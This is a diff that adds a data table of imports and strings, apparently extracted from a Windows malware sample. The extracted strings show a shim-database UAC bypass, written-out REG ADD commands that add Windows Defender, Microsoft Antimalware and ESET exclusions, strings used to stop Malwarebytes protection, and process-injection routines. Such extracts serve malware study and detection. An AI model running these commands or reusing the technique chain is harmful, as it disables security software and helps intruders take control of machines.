@@ -1,0 +1,287 @@
+reference_vaddr	symbol_addr	symbol_type	caller_function	data
+0x40103e	0x407118	import	0x40103a	KERNEL32.dll.OutputDebugStringA
+0x40105b	0x407018	import	0x401045	ADVAPI32.dll.RegOpenKeyExA
+0x40106a	0x407110	import	0x401045	KERNEL32.dll.lstrlenA
+0x401085	0x40701c	import	0x401045	ADVAPI32.dll.RegSetValueExA
+0x401090	0x407020	import	0x401045	ADVAPI32.dll.RegCloseKey
+0x4010b3	0x407018	import	0x40109b	ADVAPI32.dll.RegOpenKeyExA
+0x4010da	0x407014	import	0x40109b	ADVAPI32.dll.RegDeleteKeyA
+0x4010e5	0x407020	import	0x40109b	ADVAPI32.dll.RegCloseKey
+0x401109	0x407018	import	0x4010f1	ADVAPI32.dll.RegOpenKeyExA
+0x401134	0x407010	import	0x4010f1	ADVAPI32.dll.RegQueryValueExA
+0x40113f	0x407020	import	0x4010f1	ADVAPI32.dll.RegCloseKey
+0x40114c	0x407458	string	0x40114a	TRUE
+0x401151	0x407444	string	0x40114a	marker_UAC_bypassed
+0x401156	0x407414	string	0x40114a	SOFTWARE\Microsoft\Windows NT\CurrentVersion\
+0x4011ba	0x407190	import	0x401169	USER32.dll.wvsprintfA
+0x4011d3	0x407104	import	0x401169	KERNEL32.dll.ExpandEnvironmentStringsA
+0x4011e5	0x407178	import	0x401169	SHLWAPI.dll.PathGetArgsA
+0x4011f3	0x407108	import	0x401169	KERNEL32.dll.lstrcpynA
+0x401200	0x407174	import	0x401169	SHLWAPI.dll.PathRemoveArgsA
+0x401238	0x407460	string	0x401169	open
+0x401245	0x40716c	import	0x401169	SHELL32.dll.ShellExecuteExA
+0x401255	0x40710c	import	0x401169	KERNEL32.dll.GetLastError
+0x4012b7	0x4070fc	import	0x40125d	KERNEL32.dll.lstrcmpiW
+0x4012e3	0x4070f0	import	0x4012d9	KERNEL32.dll.GetCurrentProcess
+0x4012ea	0x40700c	import	0x4012d9	ADVAPI32.dll.OpenProcessToken
+0x4012ff	0x407474	string	0x4012f9	GetSystemWow64DirectoryA
+0x401304	0x407468	string	0x4012f9	kernel32
+0x401309	0x4070e8	import	0x4012f9	KERNEL32.dll.GetModuleHandleA
+0x401310	0x4070ec	import	0x4012f9	KERNEL32.dll.GetProcAddress
+0x401377	0x4074a0	string	0x40133c	GetNativeSystemInfo
+0x40137c	0x407490	string	0x40133c	kernel32.dll
+0x401381	0x4070e8	import	0x40133c	KERNEL32.dll.GetModuleHandleA
+0x401388	0x4070ec	import	0x40133c	KERNEL32.dll.GetProcAddress
+0x40139a	0x4070e0	import	0x40133c	KERNEL32.dll.GetSystemInfo
+0x4013a4	0x4070e4	import	0x40133c	KERNEL32.dll.GetVersionExA
+0x4013e4	0x4070e4	import	0x4013b6	KERNEL32.dll.GetVersionExA
+0x401417	0x407008	import	0x4013b6	ADVAPI32.dll.GetTokenInformation
+0x401430	0x4070dc	import	0x4013b6	KERNEL32.dll.CloseHandle
+0x401449	0x4074b4	string	0x40143c	IsWow64Process
+0x40144e	0x407468	string	0x40143c	kernel32
+0x401453	0x4070e8	import	0x40143c	KERNEL32.dll.GetModuleHandleA
+0x40145a	0x4070ec	import	0x40143c	KERNEL32.dll.GetProcAddress
+0x401475	0x4070f0	import	0x40143c	KERNEL32.dll.GetCurrentProcess
+0x401493	0x4070d8	import	0x40148f	KERNEL32.dll.GetFileAttributesA
+0x4014d1	0x4070dc	import	0x4014a4	KERNEL32.dll.CloseHandle
+0x4014e6	0x407048	import	0x4014a4	KERNEL32.dll.lstrcmpA
+0x4014f9	0x407044	import	0x4014a4	KERNEL32.dll.OpenProcess
+0x401508	0x407040	import	0x4014a4	KERNEL32.dll.TerminateProcess
+0x401532	0x4070f0	import	0x40152a	KERNEL32.dll.GetCurrentProcess
+0x40153f	0x40700c	import	0x40152a	ADVAPI32.dll.OpenProcessToken
+0x40154e	0x407008	import	0x40152a	ADVAPI32.dll.GetTokenInformation
+0x401565	0x40710c	import	0x40152a	KERNEL32.dll.GetLastError
+0x401575	0x407054	import	0x40152a	KERNEL32.dll.LocalAlloc
+0x401596	0x407038	import	0x40152a	ADVAPI32.dll.GetSidSubAuthorityCount
+0x4015a6	0x407004	import	0x40152a	ADVAPI32.dll.GetSidSubAuthority
+0x4015dc	0x407050	import	0x40152a	KERNEL32.dll.LocalFree
+0x4015e6	0x4070dc	import	0x40152a	KERNEL32.dll.CloseHandle
+0x40162b	0x407028	import	0x4015f2	ADVAPI32.dll.AllocateAndInitializeSid
+0x401654	0x407008	import	0x4015f2	ADVAPI32.dll.GetTokenInformation
+0x401672	0x407024	import	0x4015f2	ADVAPI32.dll.EqualSid
+0x401693	0x4070dc	import	0x4015f2	KERNEL32.dll.CloseHandle
+0x40169c	0x407000	import	0x4015f2	ADVAPI32.dll.FreeSid
+0x4016c4	0x407060	import	0x4016a9	KERNEL32.dll.CreateFileA
+0x4016df	0x40705c	import	0x4016a9	KERNEL32.dll.WriteFile
+0x4016f6	0x407058	import	0x4016a9	KERNEL32.dll.FlushFileBuffers
+0x4016fd	0x4070dc	import	0x4016a9	KERNEL32.dll.CloseHandle
+0x40170d	0x40710c	import	0x4016a9	KERNEL32.dll.GetLastError
+0x401747	0x40702c	import	0x401717	ADVAPI32.dll.GetUserNameA
+0x401751	0x4074c4	string	0x401717	com.%s.sdb
+0x40175c	0x407180	import	0x401717	USER32.dll.wsprintfA
+0x401776	0x407068	import	0x40176d	KERNEL32.dll.lstrcpyA
+0x401786	0x407064	import	0x40176d	KERNEL32.dll.lstrcatA
+0x4017e4	0x407070	import	0x4017b1	KERNEL32.dll.GetTempPathA
+0x4017ea	0x4074ec	string	0x4017b1	\..\..\LocalLow\
+0x4017f6	0x407064	import	0x4017b1	KERNEL32.dll.lstrcatA
+0x401808	0x4074e0	string	0x4017b1	username
+0x40180d	0x40706c	import	0x4017b1	KERNEL32.dll.GetEnvironmentVariableA
+0x401821	0x4074d0	string	0x4017b1	%s\cmd.%s.bat
+0x401829	0x407180	import	0x4017b1	USER32.dll.wsprintfA
+0x40187d	0x407108	import	0x401834	KERNEL32.dll.lstrcpynA
+0x401887	0x4070e8	import	0x401834	KERNEL32.dll.GetModuleHandleA
+0x40188e	0x407074	import	0x401834	KERNEL32.dll.GetModuleFileNameA
+0x4018a1	0x407500	string	0x401834	start "" "%s"
+0x4018a7	0x407180	import	0x401834	USER32.dll.wsprintfA
+0x4018bf	0x407060	import	0x401834	KERNEL32.dll.CreateFileA
+0x4018cc	0x40710c	import	0x401834	KERNEL32.dll.GetLastError
+0x4018dc	0x407110	import	0x401834	KERNEL32.dll.lstrlenA
+0x4018f2	0x40705c	import	0x401834	KERNEL32.dll.WriteFile
+0x401901	0x40710c	import	0x401834	KERNEL32.dll.GetLastError
+0x40190a	0x4070dc	import	0x401834	KERNEL32.dll.CloseHandle
+0x40192c	0x407070	import	0x401917	KERNEL32.dll.GetTempPathA
+0x401932	0x4074ec	string	0x401917	\..\..\LocalLow\
+0x401938	0x407064	import	0x401917	KERNEL32.dll.lstrcatA
+0x401961	0x407078	import	0x401917	KERNEL32.dll.DeleteFileA
+0x401976	0x407548	string	0x401917	"%%windir%%\system32\sdbinst.exe" /q "%s"
+0x40198f	0x40753c	string	0x401917	syswow64
+0x401996	0x407530	string	0x401917	system32
+0x40199c	0x407510	string	0x401917	"%%windir%%\%s\iscsicli.exe"
+0x4019e7	0x407070	import	0x4019cf	KERNEL32.dll.GetTempPathA
+0x4019ed	0x407064	import	0x4019cf	KERNEL32.dll.lstrcatA
+0x4019f3	0x4074ec	string	0x4019cf	\..\..\LocalLow\
+0x401a0e	0x407680	string	0x4019cf	"%%windir%%\system32\sdbinst.exe" /q /u "%s"
+0x401a18	0x407078	import	0x4019cf	KERNEL32.dll.DeleteFileA
+0x401a69	0x40707c	import	0x4019cf	KERNEL32.dll.GetWindowsDirectoryA
+0x401a6f	0x407644	string	0x4019cf	\AppPatch\Custom\{f48a0c57-7c48-461c-9957-ab255ddc986e}.sdb
+0x401a86	0x4075f0	string	0x4019cf	SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\iscsicli.exe\
+0x401a96	0x407578	string	0x4019cf	SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\{f48a0c57-7c48-461c-9957-ab255ddc986e}\
+0x401aef	0x407080	import	0x401aac	KERNEL32.dll.Sleep
+0x401b16	0x407444	string	0x401aff	marker_UAC_bypassed
+0x401b1b	0x407414	string	0x401aff	SOFTWARE\Microsoft\Windows NT\CurrentVersion\
+0x401b3c	0x407080	import	0x401aff	KERNEL32.dll.Sleep
+0x401b64	0x401b6a	string	0x401aff	hXt@
+0x401b6a	0x407458	string	0x401aff	TRUE
+0x401b74	0x407084	import	0x401aff	KERNEL32.dll.lstrcmpiA
+0x401b9a	0x407188	import	0x401b87	USER32.dll.GetClassNameA
+0x401ba4	0x4076b0	string	0x401b87	$$$Secure UAP
+0x401bad	0x407048	import	0x401b87	KERNEL32.dll.lstrcmpA
+0x401bbc	0x407184	import	0x401b87	USER32.dll.SwitchToThisWindow
+0x401c2a	0x4070e8	import	0x401be3	KERNEL32.dll.GetModuleHandleA
+0x401c31	0x407114	import	0x401be3	KERNEL32.dll.GetModuleFileNameW
+0x401c51	0x4076e0	string	0x401be3	runas
+0x401c5d	0x407094	import	0x401be3	KERNEL32.dll.lstrcatW
+0x401ca8	0x4076c0	string	0x401be3	cmd.exe
+0x401cb8	0x407090	import	0x401be3	KERNEL32.dll.CreateThread
+0x401cbf	0x4070dc	import	0x401be3	KERNEL32.dll.CloseHandle
+0x401ccb	0x407168	import	0x401be3	SHELL32.dll.ShellExecuteExW
+0x401ced	0x40708c	import	0x401be3	KERNEL32.dll.ExitProcess
+0x401d2d	0x407060	import	0x401d15	KERNEL32.dll.CreateFileA
+0x401d3e	0x4070a4	import	0x401d15	KERNEL32.dll.GetProcessHeap
+0x401d48	0x4070a0	import	0x401d15	KERNEL32.dll.HeapAlloc
+0x401d74	0x40709c	import	0x401d15	KERNEL32.dll.SetFilePointer
+0x401d85	0x40705c	import	0x401d15	KERNEL32.dll.WriteFile
+0x401d93	0x407098	import	0x401d15	KERNEL32.dll.HeapFree
+0x401d9c	0x4070dc	import	0x401d15	KERNEL32.dll.CloseHandle
+0x401dc1	0x4070b8	import	0x401dae	KERNEL32.dll.FindResourceA
+0x401e0a	0x4070b4	import	0x401dae	KERNEL32.dll.SizeofResource
+0x401e15	0x4070b0	import	0x401dae	KERNEL32.dll.LoadResource
+0x401e1f	0x4070ac	import	0x401dae	KERNEL32.dll.LockResource
+0x401e31	0x40770c	string	0x401dae	temp
+0x401e36	0x40706c	import	0x401dae	KERNEL32.dll.GetEnvironmentVariableA
+0x401e48	0x407064	import	0x401dae	KERNEL32.dll.lstrcatA
+0x401e7b	0x407700	string	0x401dae	.exe
+0x401e89	0x407078	import	0x401dae	KERNEL32.dll.DeleteFileA
+0x401ec1	0x4076ec	string	0x401dae	:Zone.Identifier
+0x401f1b	0x4070a8	import	0x401dae	KERNEL32.dll.CreateProcessA
+0x401f2c	0x40774c	string	0x401dae	EXE1
+0x401f36	0x407744	string	0x401dae	EXE2
+0x401f42	0x40773c	string	0x401dae	EXE3
+0x401f4e	0x407734	string	0x401dae	EXE4
+0x401f5a	0x40772c	string	0x401dae	EXE5
+0x401f66	0x407724	string	0x401dae	EXE6
+0x401f72	0x40771c	string	0x401dae	EXE7
+0x401f7e	0x407714	string	0x401dae	EXE8
+0x401f8c	0x407754	string	0x401f8c	RunYourMalwareHere
+0x401f9d	0x407080	import	0x401f8c	KERNEL32.dll.Sleep
+0x401fbb	0x401f2c	string	0x401f8c	hLw@
+0x401fc1	0x407768	string	0x401fc1	RunYourMalwareHereWithHighIntegrityLevel
+0x401fcc	0x401f2c	string	0x401fc1	hLw@
+0x40200c	0x4074a0	string	0x401fd1	GetNativeSystemInfo
+0x402011	0x407490	string	0x401fd1	kernel32.dll
+0x402016	0x4070e8	import	0x401fd1	KERNEL32.dll.GetModuleHandleA
+0x40201d	0x4070ec	import	0x401fd1	KERNEL32.dll.GetProcAddress
+0x40202f	0x4070e0	import	0x401fd1	KERNEL32.dll.GetSystemInfo
+0x402039	0x4070e4	import	0x401fd1	KERNEL32.dll.GetVersionExA
+0x402056	0x407bf4	string	0x402056	code2 executed in spolsvr
+0x402060	0x407b88	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions " /v *.exe /t REG_DWORD /d 0
+0x40206c	0x407b18	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions " /v *.dll /t REG_DWORD /d 0
+0x402078	0x407aa8	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions " /v *.tmp /t REG_DWORD /d 0
+0x402084	0x407a38	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes " /v afwqs.exe /t REG_DWORD /d 0
+0x402090	0x4079c8	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes " /v rgjdu.exe /t REG_DWORD /d 0
+0x40209c	0x407958	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes " /v explorer.exe /t REG_DWORD /d 0
+0x4020a8	0x4078e8	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes " /v spoolsv.exe /t REG_DWORD /d 0
+0x4020b4	0x407878	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes " /v rundll32.exe /t REG_DWORD /d 0
+0x4020c0	0x407808	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes " /v consent.exe /t REG_DWORD /d 0
+0x4020cc	0x407798	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes " /v svchost.exe /t REG_DWORD /d 0
+0x4020da	0x4080a8	string	0x402056	code1 executed in spolsvr.exe
+0x4020e4	0x408038	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Extensions " /v *.exe /t REG_DWORD /d 0
+0x4020f0	0x407fc8	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Extensions " /v *.dll /t REG_DWORD /d 0
+0x4020fc	0x407f58	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Extensions " /v *.tmp /t REG_DWORD /d 0
+0x402108	0x407ee0	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Processes " /v afwqs.exe /t REG_DWORD /d 0
+0x402114	0x407e68	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Processes " /v rgjdu.exe /t REG_DWORD /d 0
+0x402120	0x407df0	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Processes " /v explorer.exe /t REG_DWORD /d 0
+0x40212c	0x407d78	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Processes " /v spoolsv.exe /t REG_DWORD /d 0
+0x402138	0x407d00	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Processes " /v rundll32.exe /t REG_DWORD /d 0
+0x402144	0x407c88	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Processes " /v consent.exe /t REG_DWORD /d 0
+0x402150	0x407c10	string	0x402056	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Processes " /v svchost.exe /t REG_DWORD /d 0
+0x402165	0x408238	string	0x402056	code1 executed in ekrn.exe
+0x40216f	0x408180	string	0x402056	REG ADD "HKLM\SOFTWARE\ESET\ESET Security\CurrentVersion\Plugins\01000600\Profiles\@My profile\Excludes\Node_00009999 " /v Path /t REG_EXPAND_SZ /d "c:\your_file_to_exclude.exe"
+0x40217b	0x4080c8	string	0x402056	REG ADD "HKLM\SOFTWARE\ESET\ESET Security\CurrentVersion\Plugins\01000600\Profiles\@My profile\Excludes\Node_00009999 " /v Path /t REG_EXPAND_SZ /d "c:\your_file_to_exclude2.exe"
+0x4021a9	0x4070f0	import	0x40218b	KERNEL32.dll.GetCurrentProcess
+0x4021b0	0x40700c	import	0x40218b	ADVAPI32.dll.OpenProcessToken
+0x4021c1	0x408254	string	0x40218b	SeDebugPrivilege
+0x4021c7	0x407034	import	0x40218b	ADVAPI32.dll.LookupPrivilegeValueA
+0x4021e7	0x407030	import	0x40218b	ADVAPI32.dll.AdjustTokenPrivileges
+0x4021f0	0x4070dc	import	0x40218b	KERNEL32.dll.CloseHandle
+0x402208	0x4070e8	import	0x4021fc	KERNEL32.dll.GetModuleHandleA
+0x402221	0x4070d0	import	0x4021fc	KERNEL32.dll.VirtualFreeEx
+0x402233	0x4070cc	import	0x4021fc	KERNEL32.dll.VirtualAllocEx
+0x402240	0x4082b0	string	0x4021fc	VirtualAllocEx failed with error
+0x402252	0x4070c8	import	0x4021fc	KERNEL32.dll.VirtualQueryEx
+0x402294	0x4070c4	import	0x4021fc	KERNEL32.dll.VirtualProtectEx
+0x4022a4	0x4070c0	import	0x4021fc	KERNEL32.dll.WriteProcessMemory
+0x4022d0	0x40829c	string	0x4021fc	RtlCreateUserThread
+0x4022d5	0x408290	string	0x4021fc	ntdll.dll
+0x4022da	0x4070bc	import	0x4021fc	KERNEL32.dll.LoadLibraryA
+0x4022e1	0x4070ec	import	0x4021fc	KERNEL32.dll.GetProcAddress
+0x402305	0x408268	string	0x4021fc	CreateRemoteThread failed with error
+0x402371	0x407084	import	0x402317	KERNEL32.dll.lstrcmpiA
+0x402387	0x407044	import	0x402317	KERNEL32.dll.OpenProcess
+0x402393	0x4082d4	string	0x402317	OpenProcess failed with error
+0x4023ac	0x4070dc	import	0x402317	KERNEL32.dll.CloseHandle
+0x405fa6	0x40843c	string	0x4023c9	ALLUSERSPROFILE
+0x405fab	0x40706c	import	0x4023c9	KERNEL32.dll.GetEnvironmentVariableA
+0x405fb1	0x408410	string	0x4023c9	\Malwarebytes\Malwarebytes Anti-Malware\
+0x405fcc	0x408404	string	0x4023c9	ProgramData
+0x405fd1	0x40706c	import	0x4023c9	KERNEL32.dll.GetEnvironmentVariableA
+0x405fdd	0x408410	string	0x4023c9	\Malwarebytes\Malwarebytes Anti-Malware\
+0x405ff8	0x407048	import	0x4023c9	KERNEL32.dll.lstrcmpA
+0x40602d	0x4083f4	string	0x4023c9	exclusions.dat
+0x406052	0x407078	import	0x4023c9	KERNEL32.dll.DeleteFileA
+0x406096	0x4083d8	string	0x4023c9	Configuration\settings.conf
+0x4060bb	0x407078	import	0x4023c9	KERNEL32.dll.DeleteFileA
+0x406103	0x4083b8	string	0x4023c9	Configuration\scheduler.conf
+0x406128	0x407078	import	0x4023c9	KERNEL32.dll.DeleteFileA
+0x40616a	0x4083f4	string	0x4023c9	exclusions.dat
+0x40618f	0x407078	import	0x4023c9	KERNEL32.dll.DeleteFileA
+0x4061d3	0x4083d8	string	0x4023c9	Configuration\settings.conf
+0x4061f8	0x407078	import	0x4023c9	KERNEL32.dll.DeleteFileA
+0x406240	0x4083b8	string	0x4023c9	Configuration\scheduler.conf
+0x406265	0x407078	import	0x4023c9	KERNEL32.dll.DeleteFileA
+0x40629f	0x4083ac	string	0x4023c9	ProductPath
+0x4062a4	0x408370	string	0x4023c9	SYSTEM\CurrentControlSet\services\MBAMProtector\Parameters
+0x4062c0	0x408344	string	0x4023c9	C:\Program Files\Malwarebytes Anti-Malware
+0x4062d3	0x408338	string	0x4023c9	\mbam.dll
+0x4062e7	0x4070bc	import	0x4023c9	KERNEL32.dll.LoadLibraryA
+0x4062ed	0x4070ec	import	0x4023c9	KERNEL32.dll.GetProcAddress
+0x4062f5	0x408328	string	0x4023c9	ProtectionStop
+0x4062fd	0x408318	string	0x4023c9	SchedulerStop
+0x40630b	0x408300	string	0x4023c9	SelfProtectionDisable
+0x406342	0x407080	import	0x4023c9	KERNEL32.dll.Sleep
+0x406348	0x4082f4	string	0x4023c9	mbam.exe
+0x406363	0x408484	string	0x406358	start x64 inject
+0x40636d	0x408470	string	0x406358	C:\hibersys64.dll
+0x4063b7	0x407078	import	0x406358	KERNEL32.dll.DeleteFileA
+0x4063eb	0x408460	string	0x406358	rundll32.exe
+0x40640f	0x408454	string	0x406358	Bypasses
+0x40643f	0x4070d4	import	0x406358	KERNEL32.dll.MoveFileExA
+0x406445	0x40844c	string	0x406358	ended
+0x406462	0x4084d8	string	0x406454	msseces.exe
+0x40647a	0x4084cc	string	0x406454	spoolsv.exe
+0x406486	0x4084b8	string	0x406454	ekrn.exe
+0x40649a	0x4084ac	string	0x406454	ekrn.exe
+0x4064b7	0x408498	string	0x406454	mbam.exe
+0x406509	0x4070e8	import	0x4064cc	KERNEL32.dll.GetModuleHandleA
+0x406510	0x407074	import	0x4064cc	KERNEL32.dll.GetModuleFileNameA
+0x406516	0x408540	string	0x4064cc	RegDeleteKeyExA
+0x40651b	0x408530	string	0x4064cc	advapi32.dll
+0x406520	0x4070bc	import	0x4064cc	KERNEL32.dll.LoadLibraryA
+0x406527	0x4070ec	import	0x4064cc	KERNEL32.dll.GetProcAddress
+0x40652d	0x40851c	string	0x4064cc	new process runned
+0x406562	0x401fc1	string	0x4064cc	hhw@
+0x406574	0x40850c	string	0x4064cc	not admin
+0x406581	0x401f8c	string	0x4064cc	hTw@
+0x406588	0x408504	string	0x4064cc	admin
+0x4065c0	0x407080	import	0x4064cc	KERNEL32.dll.Sleep
+0x406600	0x407100	import	0x406600	KERNEL32.dll.Process32NextW
+0x406606	0x4070f8	import	0x406606	KERNEL32.dll.Process32FirstW
+0x40660c	0x4070f4	import	0x40660c	KERNEL32.dll.CreateToolhelp32Snapshot
+0x406612	0x407088	import	0x406612	KERNEL32.dll.Process32Next
+0x406618	0x40704c	import	0x406618	KERNEL32.dll.Process32First
+0x40661e	0x407148	import	0x40661e	MSVCRT.dll.memcpy
+0x406624	0x40714c	import	0x406624	MSVCRT.dll.strlen
+0x40662a	0x407150	import	0x40662a	MSVCRT.dll.strcat
+0x40665d	0x40712c	import	0x40662a	MSVCRT.dll.__set_app_type
+0x406672	0x407130	import	0x40662a	MSVCRT.dll.__p__fmode
+0x406680	0x407134	import	0x40662a	MSVCRT.dll.__p__commode
+0x4066ac	0x40713c	import	0x40662a	MSVCRT.dll.__setusermatherr
+0x4066e5	0x407144	import	0x40662a	MSVCRT.dll.__getmainargs
+0x406734	0x40711c	import	0x40662a	KERNEL32.dll.GetStartupInfoA
+0x40673e	0x406751	string	0x40662a	j\nXPVSS
+0x406758	0x4070e8	import	0x40662a	KERNEL32.dll.GetModuleHandleA
+0x406768	0x40715c	import	0x40662a	MSVCRT.dll.exit
+0x40678e	0x407158	import	0x40678e	MSVCRT.dll._XcptFilter
+0x406794	0x407140	import	0x406794	MSVCRT.dll._initterm
+0x4067b0	0x407128	import	0x4067af	MSVCRT.dll._except_handler3
+0x4067b6	0x407124	import	0x4067b6	MSVCRT.dll._controlfp
